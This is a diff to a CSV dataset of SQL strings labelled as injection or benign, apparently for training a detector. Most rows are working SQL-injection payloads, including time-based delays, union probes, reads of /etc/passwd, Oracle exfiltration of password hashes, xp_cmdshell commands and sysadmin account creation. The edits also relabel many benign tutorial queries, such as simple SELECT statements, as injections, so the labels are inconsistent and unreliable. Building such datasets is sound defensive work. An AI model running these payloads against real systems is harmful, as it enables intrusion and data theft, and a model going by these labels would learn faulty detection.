@@ -1,6 +1,6 @@
 query,label
 """ or pg_sleep  (  __TIME__  )  --",1
-create user name identified by pass123 temporary tablespace temp default tablespace users,
+create user name identified by pass123 temporary tablespace temp default tablespace users, 1
 " AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  table_name  )   FROM   (  SELECT DISTINCT  (  table_name  )  , ROWNUM AS LIMIT FROM sys.all_tables  )   WHERE LIMIT  =  5   )    )    AND 'i'  =  'i",1
 " select * from users where id  =  '1' or @ @1  =  1 union select 1,version  (    )   -- 1'",1
 " select * from users where id  =  1 or 1#""  (   union select 1,version  (    )   -- 1",1
@@ -136,8 +136,8 @@ select * from users where id  =  1 %!<@ or 1  =  1 -- 1,1
 " select * from users where id  =  1 <1## union select 1,version  (    )   -- 1",1
 " select * from users where id  =  1 + $+*\ union select null,@@VERSION -- 1",1
 select * from users where id  =  1. <@ or 1  =  1 -- 1,1
- or true--,1
-, execute immediate 'sel' || 'ect us' || 'er'
+or true--,1 
+execute immediate 'sel' || 'ect us' || 'er', 1
 hi' or 'x'  =  'x',
 select * from users where id  =  1 <@ or 1  =  1 -- 1,1
 " select * from users where id  =  1 or "".,"" or 1  =  1 -- 1",1
@@ -146,7 +146,7 @@ admin' #,1
 " select * from users where id  =  1 or "",  (  "" or 1  =  1 -- 1",1
 " select * from users where id  =  1 or "",{"" or 1  =  1 -- 1",1
 " union select 1,load_file  (  '/etc/passwd'  )  ,1,1,1;",1
-"""  )  ;waitfor delay '0:0:__TIME__'--",1
+"waitfor delay '0:0:__TIME__'--""",1
  or 'unusual'   =   'unusual',1
 "insert into mysql.user   (  user, host, password  )   values   (  'name', 'localhost', password  (  'pass123'   )    )   ",1
 "admin"" or ""1""  =  ""1""/*",1
@@ -189,7 +189,7 @@ or 0  =  0 #,1
 union select * from users where login   =   char ...,1
 " select * from users where id  =  1 union select 1||@,version  (    )   -- 1",1
 admin'  )   or '1'  =  '1'--,1
-1,SELECT *
+SELECT *, 1
 " select * from users where id  =  1 or ""{;"" or 1  =  1 -- 1",1
 x' and 1  =    (  select count  (  *  )   from tabname  )  , --
 " select * from users where id  =  '1' or """"<@ union select 1,version  (    )   -- 1'",1
@@ -200,7 +200,7 @@ procedure,1
 or ''  =  ',1
  AND 1  =  utl_inaddr.get_host_address   (    (   SELECT SYS.LOGIN_USER FROM DUAL   )    )    AND 'i'  =  'i,1
 " AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  USERNAME  )   FROM   (  SELECT DISTINCT  (  USERNAME  )  , ROWNUM AS LIMIT FROM SYS.ALL_USERS  )   WHERE LIMIT  =  2   )    )    AND 'i'  =  'i",1
-\', desc users
+desc users, 0
 " select * from users where id  =  1 or   (  \.  )    =  1 union select 1,@@VERSION -- 1",1
 select * from users where id  =  '1' or $ 1  =  1 or 1  =  1 -- 1',1
 """ or """"^""",1
@@ -260,14 +260,14 @@ select * from users where id  =  1 or \<   =  1 or 1  =  1 -- 1,1
 " select * from users where id  =  1 or ""??"" or 1  =  1 -- 1",1
 " AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  PASSWORD  )   FROM   (  SELECT DISTINCT  (  PASSWORD  )  , ROWNUM AS LIMIT FROM SYS.USER$  )   WHERE LIMIT  =  5   )    )    AND 'i'  =  'i",1
 " AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  column_name  )   FROM   (  SELECT DISTINCT  (  column_name  )  , ROWNUM AS LIMIT FROM all_tab_columns  )   WHERE LIMIT  =  7   )    )    AND 'i'  =  'i",1
-&apos, OR
-sqlvuln,
+&apos OR, 1
+sqlvuln, 1
 select * from users where id  =  1 + $+%$ or 1  =  1 -- 1,1
 select * from users where id  =  '1' + $+%\ or 1  =  1 -- 1',1
 """ or """"*""",1
 "hi or 1  =  1 --""",1
 " select * from users where id  =  1. union select null,banner from v$version where rownum  =  1 -- 1",1
-, exec master..xp_cmdshell 'ping 172.10.1.255'--
+exec master..xp_cmdshell 'ping 172.10.1.255'--, 1
 " select * from users where id  =  '1' or 1^  =  1 union select 1,banner from v$version where rownum  =  1 -- 1'",1
 " select * from users where id  =  '1' union select ""?""_,version  (    )   -- 1'",1
 select * from information_schema.tables--,1
@@ -297,7 +297,7 @@ declare @s varchar  (  22  )   select @s   = ,1
 " select * from users where id  =  1 + \+*\ union select null,@@VERSION -- 1",1
 " select * from users where id  =  1 or 1#"". union select version  (    )  ,version  (    )   -- 1",1
 @variable,1
-, exec master..xp_cmdshell
+exec master..xp_cmdshell, 1
 select * from users where id  =  1 +  (  1  )   or 1  =  1 -- 1,1
 " select * from users where id  =  1 union select @ 1$,version  (    )   -- 1",1
 " select * from users where id  =  1 union select @ 1a,version  (    )   -- 1",1
@@ -315,7 +315,7 @@ or '1'  =  '1,1
 " select * from users where id  =  '1' or \.<1 union select 1,@@VERSION -- 1'",1
 " select * from users where id  =  '1' <@&1 union select 1,version  (    )   -- 1'",1
 " AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  table_name  )   FROM   (  SELECT DISTINCT  (  table_name  )  , ROWNUM AS LIMIT FROM sys.all_tables  )   WHERE LIMIT  =  4   )    )    AND 'i'  =  'i",1
-, if is_srvrolemember  (  'sysadmin'  )   > 0 waitfor delay '0:0:2' --
+if is_srvrolemember  (  'sysadmin'  )   > 0 waitfor delay '0:0:2' --, 1 
 select * from users where id  =  1 <@<@ or 1  =  1 -- 1,1
 " select * from users where id  =  1 union select @<@$,version  (    )   -- 1",1
 " select * from users where id  =  '1' <@<@ union select 1,version  (    )   -- 1'",1
@@ -352,7 +352,7 @@ pg_sleep  (  __TIME__  )  --,1
 " AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  table_name  )   FROM   (  SELECT DISTINCT  (  table_name  )  , ROWNUM AS LIMIT FROM sys.all_tables  )   WHERE LIMIT  =  7   )    )    AND 'i'  =  'i",1
 """ or """" """,1
 delete,1
-,waitfor delay '0:0:__TIME__'--
+waitfor delay '0:0:__TIME__'--, 1
  or 1  =  1 --,1
 1' and non_existant_table   =   '1,1
 " select * from users where id  =  1 or ""&  )  "" or 1  =  1 -- 1",1
@@ -393,7 +393,7 @@ or sleep  (  __TIME__  )    =  ',1
 " select * from users where id  =  1 union select +!<@,version  (    )   -- 1",1
 " select * from users where id  =  1 <@<@ union select null,version  (    )   -- 1",1
 or 2 > 1,1
-, exec   (  'sel' + 'ect us' + 'er'  ) 
+exec   (  'sel' + 'ect us' + 'er'  ), 1
 anything' OR 'x'  =  'x,1
 " select * from users where id  =  1 or \<\ union select 1,@@VERSION -- 1",1
 " select * from users where id  =  1 union select   (  1  )  ,banner from v$version where rownum  =  1 -- 1",1
@@ -405,7 +405,7 @@ a' or 3  =  3--,1
 "admin""or 1  =  1 or """"  =  """,1
 uni/**/on sel/**/ect,1
 """ or """"&""",1
- )    )   ,waitfor delay '0:0:__TIME__'--
+waitfor delay '0:0:__TIME__'--, 1
 " select * from users where id  =  1 or ""?;"" or 1  =  1 -- 1",1
 1 waitfor delay '0:0:10'--,1
 bfilename,1
@@ -443,24 +443,24 @@ select * from users where id  =  '1'   or 1  =  1 -- 1',1
  or '' ',1
 " select * from users where id  =  1 or "";#"" or 1  =  1 -- 1",1
 or 1  =  1,1
- , drop table temp --
+drop table temp --, 1
 " AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  PASSWORD  )   FROM   (  SELECT DISTINCT  (  PASSWORD  )  , ROWNUM AS LIMIT FROM SYS.USER$  )   WHERE LIMIT  =  2   )    )    AND 'i'  =  'i",1
 """ or benchmark  (  10000000,MD5  (  1   )    )   #",1
 """ or ""x""  =  ""x",1
 select * from users where id  =  '1'<@.. or 1  =  1 -- 1',1
 " select * from users where id  =  1 or !<@ union select 1,version  (    )   -- 1",1
  or 'something' like 'some%',1
-, if not   (    (   select serverproperty  (  'isintegratedsecurityonly'   )    )    <> 0  )   waitfor delay '0:0:2' --
+if not   (    (   select serverproperty  (  'isintegratedsecurityonly'   )    )    <> 0  )   waitfor delay '0:0:2' --, 1
 " AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  PASSWORD  )   FROM   (  SELECT DISTINCT  (  PASSWORD  )  , ROWNUM AS LIMIT FROM SYS.USER$  )   WHERE LIMIT  =  4   )    )    AND 'i'  =  'i",1
 select * from users where id  =  '1' or \<\. or 1  =  1 -- 1',1
-, exec master..xp_cmdshell 'ping 10.10.1.2'--
+exec master..xp_cmdshell 'ping 10.10.1.2'--, 1
 admin' or '1'  =  '1'--,1
-, if not   (    (   select serverproperty  (  'isintegratedsecurityonly'   )    )    <> 1  )   waitfor delay '0:0:2' --
+if not   (    (   select serverproperty  (  'isintegratedsecurityonly'   )    )    <> 1  )   waitfor delay '0:0:2' --, 1
 " AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  table_name  )   FROM   (  SELECT DISTINCT  (  table_name  )  , ROWNUM AS LIMIT FROM sys.all_tables  )   WHERE LIMIT  =  2   )    )    AND 'i'  =  'i",1
 " select * from users where id  =  1 <@<@ union select version  (    )  ,version  (    )   -- 1",1
 " select * from users where id  =  1 or 1#""$ union select null,version  (    )   -- 1",1
 """;waitfor delay '0:0:__TIME__'--",1
-x' and userid is NULL, --
+x' and userid is NULL, 1
 select * from users where id  =  '1' *$ 1 or 1  =  1 -- 1',1
 " select * from users where id  =  1 or \<\ union select null,@@VERSION -- 1",1
 " select * from users where id  =  1 or ""?@"" or 1  =  1 -- 1",1
@@ -535,7 +535,7 @@ asc,1
 select * from users where id  =  1 or $<\ or 1  =  1 -- 1,1
 "admin""/*",1
 " select * from users where id  =  1.  union select 1,version  (    )   -- 1",1
- )  ,waitfor delay '0:0:__TIME__'--
+waitfor delay '0:0:__TIME__'--, 1
 " select * from users where id  =  1 union select @<@.,version  (    )   -- 1",1
 " select * from users where id  =  1 or ""._"" or 1  =  1 -- 1",1
 "admin"" or ""1""  =  ""1",1
@@ -574,10 +574,10 @@ declare @s varchar   (  8000  )   select @s   =   0x73656c ...,1
 " select * from users where id  =  1. union select 1,banner from v$version where rownum  =  1 -- 1",1
 " select * from users where id  =  1 or "".;"" or 1  =  1 -- 1",1
 " select * from users where id  =  1 union select 1 1a,version  (    )   -- 1",1
-, begin declare @var varchar  (  8000  )   set @var  =  ':' select @var  =  @var+'+login+'/'+password+' ' from users where login >
+begin declare @var varchar  (  8000  )   set @var  =  ':' select @var  =  @var+'+login+'/'+password+' ' from users where login >, 1 
 " union   (  select NULL, NULL, NULL, NULL,    (  select @@version   )    )    --",1
 hi' or 1  =  1 --,1
- UNION SELECT,1
+UNION SELECT,1
 select * from users where id  =  1 %  (  $  )   or 1  =  1 -- 1,1
 " select * from users where id  =  1 or 1#""  (   union select 'a',version  (    )   -- 1",1
 " select * from users where id  =  1 or ""{  )  "" or 1  =  1 -- 1",1
@@ -667,13 +667,13 @@ declare @q nvarchar   (  4000  )   select @q   = ,1
 admin'  )   or   (  '1'  =  '1'#,1
 or a   =   a,1
 select * from users where id  =  '1' or !<@ or 1  =  1 -- 1',1
-, or '1'  =  '1'
+or '1'  =  '1', 1
 declare @q nvarchar   (  200  )   0x730065006c00650063007400200040004000760065007200730069006f006e00 exec  (  @q  ) ,1
 "admin"" #",1
 select * from users where id  =  1 %  (  1  )   or 1  =  1 -- 1,1
 " select * from users where id  =  '1' or \<   =  1 union select 1,@@VERSION -- 1'",1
 " select * from users where id  =  1 or @#""  (    =  1 or 1  =  1 -- 1",1
-, begin declare @var varchar  (  8000  )   set @var  =  ' ...
+begin declare @var varchar  (  8000  )   set @var  =  ' ..., 1
 select * from users where id  =  1 + \+%$ or 1  =  1 -- 1,1
  )   or pg_sleep  (  __TIME__  )  --,1
 PRINT @@variable,1
@@ -812,14 +812,14 @@ admin' or '1'  =  '1'/*,1
 " select * from users where id  =  1 or "";  )  ""  =  1 or 1  =  1 -- 1",1
 " select * from users where id  =  '1' +   (  \.  )   union select 1,@@VERSION -- 1'",1
 "<>""'%;  )    (  &+",1
- and 1  =  0  )   union all,1
- or a  =  a--,1
+and 1  =  0  )   union all,1
+or a  =  a--,1
 0x770061006900740066006F0072002000640065006C00610079002000270030003A0030003A,1
 " select * from users where id  =  1 union select 1 $$,version  (    )   -- 1",1
 " select * from users where id  =  1 or   (  1  )    =  1 union select 1,banner from v$version where rownum  =  1 -- 1",1
- (  sqlvuln  ) ,1
- or 'text'   =   n'text',1
- or '1'  =  '1'--,1
+(  sqlvuln  ) ,1
+or 'text'   =   n'text',1
+or '1'  =  '1'--,1
 0x730065006c00650063007400200040004000760065007200730069006f006e00 exec  (  @q  ) ,1
 " select * from users where id  =  '1' + @ 1! union select 1,version  (    )   -- 1'",1
 " select * from users where id  =  '1' union select ""[""_,version  (    )   -- 1'",1
@@ -867,7 +867,7 @@ x' OR full_name LIKE '%Bob%,1
 " select * from users where id  =  1 or ""?["" or 1  =  1 -- 1",1
 " select * from users where id  =  1 union select !<@,version  (    )   -- 1",1
 " or benchmark  (  10000000,MD5  (  1   )    )   #",1
-  )  ,waitfor delay '0:0:__TIME__'--
+waitfor delay '0:0:__TIME__'--, 1
  or sleep  (  __TIME__  )    =  ',1
 # from wapiti,1
 """ or sleep  (  __TIME__  )    =  """,1
@@ -878,7 +878,7 @@ sleep  (  __TIME__  )  #,1
  or pg_sleep  (  __TIME__  )  --,1
    )    )    or pg_sleep  (  __TIME__  )  --,1
   )   or sleep  (  __TIME__  )    =  ',1
-   )    )   ,waitfor delay '0:0:__TIME__'--
+   )    )  waitfor delay '0:0:__TIME__'--, 1
 "1'   )    )    or 8156  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",1
 "1  )   as clye where 7842  =  7842 and char  (  109  )  ||char  (  79  )  ||char  (  70  )  ||char  (  90  )    =  regexp_substring  (  repeat  (  right  (  char  (  5012  )  ,0  )  ,5000000000  )  ,null  )  --",1
 "-4860'  )   as azyx where 6901  =  6901 union all select 6901,6901,6901,6901,6901#",1
@@ -19288,7 +19288,8 @@ a',1
 admin' or ',1
  or 'something'   =   'some'+'thing',1
  or 'whatever' in   (  'whatever'  ) ,1
-grant connect to name, grant resource to name
+grant connect to name, 1
+grant resource to name, 1
 &1c,1
  (  s,1
  )  s,1
@@ -19893,27 +19894,30 @@ SELECT * INTO newtable FROM oldtable WHERE 1  =  0,
 "SELECT ProductName, UnitPrice *  ( UnitsInStock + ISNULL ( UnitsOnOrder, 0  )  )   FROM Products;",0
 "SELECT ProductName, UnitPrice *  ( UnitsInStock + IIF ( IsNull ( UnitsOnOrder ) , 0, UnitsOnOrder  )  )   FROM Products;",0
 "SELECT ProductName, UnitPrice *  ( UnitsInStock + NVL ( UnitsOnOrder, 0  )  )   FROM Products;",0
-SELECT * FROM Customers GO, EXEC SelectAllCustomers
+SELECT * FROM Customers GO, 1
+EXEC SelectAllCustomers, 1
 "SELECT * FROM Customers WHERE City  =  @City GO; EXEC SelectAllCustomers @City  =  'London'; CREATE PROCEDURE SelectAllCustomers @City nvarchar ( 30 ) , @PostalCode nvarchar ( 10 )  AS ",0
 "SELECT * FROM Customers WHERE City  =  @City AND PostalCode  =  @PostalCode GO;  EXEC SelectAllCustomers @City  =  'London', @PostalCode  =  'WA1 1DP';",0
 SELECT * FROM Customers -- WHERE City = 'Berlin',
---SELECT * FROM Customers,
-SELECT * FROM Products, /*Select all the columns of all the records in the Customers table:*/
-/*SELECT * FROM Customers,
-SELECT * FROM Products,
-SELECT * FROM Orders,
-SELECT * FROM Categories,*/
-SELECT * FROM Suppliers,
+--SELECT * FROM Customers, 1
+SELECT * FROM Products, 0
+/*SELECT * FROM Customers, 1
+SELECT * FROM Products, 0
+SELECT * FROM Orders, 0
+SELECT * FROM Categories, 0 
+SELECT * FROM Suppliers, 0 
 "SELECT CustomerName, /*City,*/ Country FROM Customers;",0
 SELECT * FROM Customers WHERE  ( CustomerName LIKE 'L%' OR CustomerName LIKE 'R%' /*OR CustomerName LIKE 'S%' OR CustomerName LIKE 'T%'*/ OR CustomerName LIKE 'W%' )  AND Country = 'USA' ORDER BY CustomerName,
 "    SELECT column1, column2,...     FROM existing_table_name     WHERE ....; CREATE TABLE TestTable AS ",0
 "SELECT customername, contactname FROM  customers; ",0
 "SELECT column1 , column2 , ... FROM table_name WHERE condition ; CREATE VIEW [Brazil Customers] AS ",0
 "SELECT CustomerName, ContactName FROM Customers WHERE  Country  =  'Brazil';",0
-SELECT * FROM [Brazil Customers], CREATE VIEW [Products Above Average Price] AS
+SELECT * FROM [Brazil Customers], 1
+CREATE VIEW [Products Above Average Price] AS, 1
 "SELECT ProductName, Price FROM Products ",0
 WHERE Price >  ( SELECT AVG ( Price )  FROM Products ) ,
-SELECT * FROM [Products Above Average Price], CREATE OR REPLACE VIEW view_name AS
+SELECT * FROM [Products Above Average Price], 1
+CREATE OR REPLACE VIEW view_name AS, 1
 "SELECT column1 , column2 , ... FROM table_name WHERE condition ; CREATE OR REPLACE VIEW [Brazil Customers] AS ",0
 "SELECT CustomerName, ContactName, City FROM Customers WHERE Country  =  'Brazil'; DROP VIEW view_name ; DROP VIEW [Brazil Customers];",0
 SELECT * FROM Users WHERE UserId  =  105 OR 1 = 1,
@@ -19936,17 +19940,18 @@ SELECT * FROM [Brazil Customers], 0
 SELECT * FROM Customers GO,  0
 SELECT * FROM [Brazil   Customers],
 "SELECT CustomerName, ContactName FROM Customers WHERE  Country  =  ""Brazil"";",0
-SELECT * FROM Customers ORDER BY CustomerName DESC,
-WHERE EXISTS  ( SELECT ProductName FROM   Products WHERE SupplierId  =  Suppliers.supplierId AND Price < 20 ) ,
-WHERE EXISTS  ( SELECT ProductName FROM   Products WHERE SupplierId  =  Suppliers.supplierId AND Price  =  22 ) ,
-SELECT * FROM Customers, DELETE FROM Customers  WHERE CustomerName = 'Alfreds Futterkiste'
-SELECT * FROM Customers  WHERE CustomerName LIKE 'a_%_%',
-SELECT * FROM Customers WHERE ROWNUM < =  3,
-SELECT * FROM Customers ORDER BY CustomerName,
+SELECT * FROM Customers ORDER BY CustomerName DESC, 1
+WHERE EXISTS  ( SELECT ProductName FROM   Products WHERE SupplierId  =  Suppliers.supplierId AND Price < 20 ) , 1
+WHERE EXISTS  ( SELECT ProductName FROM   Products WHERE SupplierId  =  Suppliers.supplierId AND Price  =  22 ) , 1
+SELECT * FROM Customers, 0
+DELETE FROM Customers  WHERE CustomerName = 'Alfreds Futterkiste',1
+SELECT * FROM Customers  WHERE CustomerName LIKE 'a_%_%', 1
+SELECT * FROM Customers WHERE ROWNUM < =  3, 0
+SELECT * FROM Customers ORDER BY CustomerName, 0
 "SELECT customername, contactname FROM customers; ALTER TABLE Customers ADD Email varchar ( 255 ) ; ALTER TABLE Customers DROP COLUMN Email; DROP TABLE Shippers;  TRUNCATE TABLE Categories;",0
 SELECT * FROM [Brazil Customers], 0
-"SELECT CustomerName, ContactName, City FROM Customers WHERE Country  =  ""Brazil""; DROP VIEW [Brazil Customers];",0
-SELECT ASCII ( CustomerName )  AS NumCodeOfFirstChar FROM Customers,
+"SELECT CustomerName, ContactName, City FROM Customers WHERE Country  =  ""Brazil""; DROP VIEW [Brazil Customers];",0 
+SELECT ASCII ( CustomerName )  AS NumCodeOfFirstChar FROM Customers, 1
 "SELECT CHAR_LENGTH ( ""SQL Tutorial"" )  AS LengthOfString;",0
 SELECT CHAR_LENGTH ( CustomerName )  AS LengthOfName FROM Customers,
 "SELECT CHARACTER_LENGTH ( ""SQL Tutorial"" )  AS LengthOfString;",0
@@ -20291,7 +20296,7 @@ SELECT * FROM Customers  WHERE NOT Country = 'Germany'  AND NOT Country = 'USA',
 "   SELECT CustomerName, ContactName, AddressFROM CustomersWHERE Address   IS NOT NULL;",0
 "  UPDATE Customers  SET ContactName  =  'Alfred Schmidt', City =  'Frankfurt' WHERE CustomerID  =  1;",0
  UPDATE Customers SET ContactName = 'Juan'WHERE Country = 'Mexico',
-SELECT * FROM CustomersLIMIT 3,
+SELECT * FROM CustomersLIMIT 3, 1
 DELETE FROM Customers  WHERE CustomerName = 'Alfreds Futterkiste',
 DELETE FROM Customers,
 SELECT column_name ( s )  FROM table_name,0
@@ -20303,16 +20308,16 @@ SELECT * FROM CustomersWHERE Country = 'Germany'LIMIT 3,
 SELECT * FROM CustomersWHERE Country = 'Germany'FETCH FIRST 3 ROWS ONLY,
 SELECT MIN ( Price )  AS SmallestPriceFROM Products,
 SELECT *FROM  ( SELECT column_name ( s )  FROM,0
-SELECT TOP 3 * FROM Customers,  SELECT * FROM CustomersLIMIT 3
-SELECT * FROM CustomersLIMIT 3,SELECT * FROM Customers
-SELECT * FROM CustomersFETCH FIRST 3 ROWS ONLY, SELECT TOP 50 PERCENT * FROM Customers
-SELECT TOP 50 PERCENT * FROM Customers, SELECT * FROM CustomersFETCH FIRST 50 PERCENT ROWS ONLY
-SELECT * FROM CustomersFETCH FIRST 50 PERCENT ROWS ONLY,SELECT TOP 3 * FROM Customers
-SELECT TOP 3 * FROM CustomersWHERE Country = 'Germany', SELECT * FROM Customers
-SELECT AVG ( Price ) FROM Products,
-SELECT AVG ( Price ) FROM Products,SELECT SUM ( Quantity ) 
+SELECT TOP 3 * FROM Customers, 1
+SELECT * FROM CustomersLIMIT 3,1
+SELECT * FROM CustomersFETCH FIRST 3 ROWS ONLY, 1
+SELECT TOP 50 PERCENT * FROM Customers, 1
+SELECT * FROM CustomersFETCH FIRST 50 PERCENT ROWS ONLY,1
+SELECT TOP 3 * FROM CustomersWHERE Country = 'Germany', 1
+SELECT AVG ( Price ) FROM Products, 1
+SELECT AVG ( Price ) FROM Products,1
 SELECT COUNT ( ProductID ) FROM Products,
-SELECT * FROM Customers   WHERE CustomerName NOT LIKE 'a%',
+SELECT * FROM Customers   WHERE CustomerName NOT LIKE 'a%',1
 "  SELECT * FROM Customers   WHERE Country IN  ( 'Germany', 'France', 'UK' ) ; ",0
 "  SELECT * FROM Customers   WHERE Country NOT IN  ( 'Germany', 'France', 'UK' ) ; ",0
 SELECT * FROM Customers   WHERE Country IN  ( SELECT Country FROM Suppliers ) ,
@@ -20340,9 +20345,9 @@ SELECT column_name ( s )  FROM table1 FULL OUTER JOIN,0
 " SELECT column_name ( s ) FROM table1 T1, table1 T2  WHERE ",0
 "   SELECT A.CustomerName AS CustomerName1, B.CustomerName AS CustomerName2,    A.CityFROM Customers A, Customers BWHERE A.CustomerID <> B.CustomerID  AND A.City  =  B.City ",0
 SELECT column_name ( s )  FROM table1 UNION,0
-SELECT column_name ( s )  FROM table2, SELECT column_name ( s ) 
+SELECT column_name ( s )  FROM table2, 1
 SELECT column_name ( s )  FROM table1 UNION ALL,0
-SELECT column_name ( s )  FROM table2, SELECT City FROM Customers
+SELECT column_name ( s )  FROM table2, 1
 SELECT City FROM CustomersUNIONSELECT City FROM SuppliersORDER BY City,
 SELECT City FROM CustomersUNION ALLSELECT City FROM Suppliers ORDER BY City,
 "  SELECT City, Country FROM CustomersWHERE Country = 'Germany'UNION SELECT City, Country FROM Suppliers",0
@@ -31067,11 +31072,12 @@ uni/**/on sel/**/ect,1
 '; exec master..xp_cmdshell 'ping 10.10.1.2'--,1
 create user name identified by 'pass123',1
 create user name identified by pass123 temporary tablespace temp default tablespace users; ,1
-' ; drop table temp --,1
+drop table temp --,1
 "exec sp_addlogin 'name' , 'password'",1
 "exec sp_addsrvrolemember 'name' , 'sysadmin'",1
 "insert into mysql.user  ( user, host, password )  values  ( 'name', 'localhost', password ( 'pass123'  )  )  ",1
-grant connect to name; grant resource to name;,1
+grant connect to name,1
+grant resource to name;,1
 "insert into users ( login, password, level )  values (  char ( 0x70 )  + char ( 0x65 )  + char ( 0x74 )  + char ( 0x65 )  + char ( 0x72 )  + char ( 0x70 )  + char ( 0x65 )  + char ( 0x74 )  + char ( 0x65 )  + char ( 0x72 ) ,char ( 0x64 ) ",1
 ' or 1 = 1 --,1
 ' union  ( select @@version )  --,1
@@ -31786,7 +31792,7 @@ a' or 3 = 3--,1
 ; execute immediate 'sel' || 'ect us' || 'er',1
 "benchmark ( 10000000,MD5 ( 1  )  )  #",1
 update,1
-""";waitfor delay '0:0:__TIME__'--",1
+"waitfor delay '0:0:__TIME__'--""",1
 1 )  or pg_sleep ( __TIME__ ) --,1
 "|| ( elt ( -3+5,bin ( 15 ) ,ord ( 10 ) ,hex ( char ( 45  )  )    )  )  ",1
 """hi"""" )  or  ( """"a"""" = """"a""",1
@@ -31840,7 +31846,7 @@ or 1 = 1,1
  or 1 = 1 or '' = ',1
 declare @s varchar  ( 200 )  select @s  =  0x73656c6 ...,1
 exec xp,1
-; exec master..xp_cmdshell 'ping 172.10.1.255'--,1
+exec master..xp_cmdshell 'ping 172.10.1.255'--,1
 3.10E+17,1
 """ or pg_sleep ( __TIME__ ) --",1
 x' AND email IS NULL; --,1
